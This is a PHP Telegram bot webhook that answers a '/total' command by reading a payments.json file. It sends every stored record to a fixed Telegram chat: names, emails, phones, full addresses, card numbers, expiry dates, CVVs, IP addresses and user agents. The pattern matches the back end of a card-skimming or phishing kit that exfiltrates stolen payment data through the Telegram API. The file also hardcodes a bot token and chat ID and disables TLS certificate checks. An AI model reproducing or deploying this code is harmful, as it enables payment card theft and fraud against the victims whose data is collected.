
<?php
/**
 * Simple Telegram Bot Listener
 * Handles /total command
 */

// Telegram configuration
define('BOT_TOKEN', '7835330346:AAEAnJ2nNDQ3tUfiLfB8SgDFERzZ0fYA_Ac');
define('CHAT_ID', '-4844832082');

// Get webhook data
$input = file_get_contents('php://input');
$update = json_decode($input, true);

// Log the update for debugging
error_log('Bot Update: ' . $input);

if (isset($update['message'])) {
    $message = $update['message'];
    $text = $message['text'] ?? '';
    $chatId = $message['chat']['id'] ?? '';
    
    // Only respond to messages from our chat
    if ($chatId == CHAT_ID) {
        if ($text === '/total') {
            handleTotalCommand();
        }
    }
}

function handleTotalCommand() {
    $dataFile = '/var/www/html/data/payments.json';
    
    if (!file_exists($dataFile)) {
        $response = "No payment records found.";
    } else {
        $data = json_decode(file_get_contents($dataFile), true);
        if (!$data || empty($data)) {
            $response = "No payment records found.";
        } else {
            $response = "TOTAL PAYMENT RECORDS:\n\n";
            foreach ($data as $index => $payment) {
                $num = $index + 1;
                $response .= "$num. " . $payment['name'] . "\n";
                $response .= $payment['email'] . "\n";
                $response .= $payment['phone'] . "\n";
                $response .= $payment['country'] . "\n";
                $response .= $payment['region'] . "\n";
                $response .= $payment['city'] . "\n";
                $response .= $payment['address'] . "\n";
                $response .= $payment['zip'] . "\n";
                $response .= $payment['card'] . "\n";
                $response .= $payment['expiry'] . "\n";
                $response .= $payment['cvv'] . "\n";
                $response .= $payment['ip'] . "\n";
                $response .= substr($payment['user_agent'], 0, 100) . "...\n\n";
            }
            $response .= "Total Records: " . count($data);
        }
    }
    
    sendTelegramMessage($response);
}

function sendTelegramMessage($text) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    
    $data = [
        'chat_id' => CHAT_ID,
        'text' => $text
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}
?>